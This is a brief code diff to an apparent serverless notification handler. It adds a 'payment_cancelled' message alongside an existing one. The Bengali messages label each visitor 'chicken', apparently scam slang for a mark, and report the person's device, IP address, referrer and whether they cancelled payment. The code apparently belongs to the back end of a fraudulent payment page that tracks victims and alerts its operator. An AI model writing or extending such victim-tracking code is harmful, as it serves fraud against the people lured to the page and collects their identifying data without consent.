@@ -85,7 +85,15 @@ serve(async (req) => {
         `-------------------\n\n` +
         `🐔মুরগির Device : ${device}\n` +
         `🐔মুরগির IP : ${clientIp}\n` +
-        `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
+        `🐔মুরগির Referrer : ${displayReferrer}`;
+    } else if (type === 'payment_cancelled') {
+      message = `🐔 মুরগি পেমেন্ট ক্যানসেল করেছে ✅\n\n` +
+        `-------------------\n\n` +
+        `Update : ক্যানসেল পেইজে গেছে ।\n\n` +
+        `-------------------\n\n` +
+        `🐔মুরগির Device : ${device}\n` +
+        `🐔মুরগির IP : ${clientIp}\n` +
+        `🐔মুরগির Referrer : ${displayReferrer}`;
     } else {
       message = `📢 *Notification*\n\n${JSON.stringify({ type, amount, method })}`;
     }
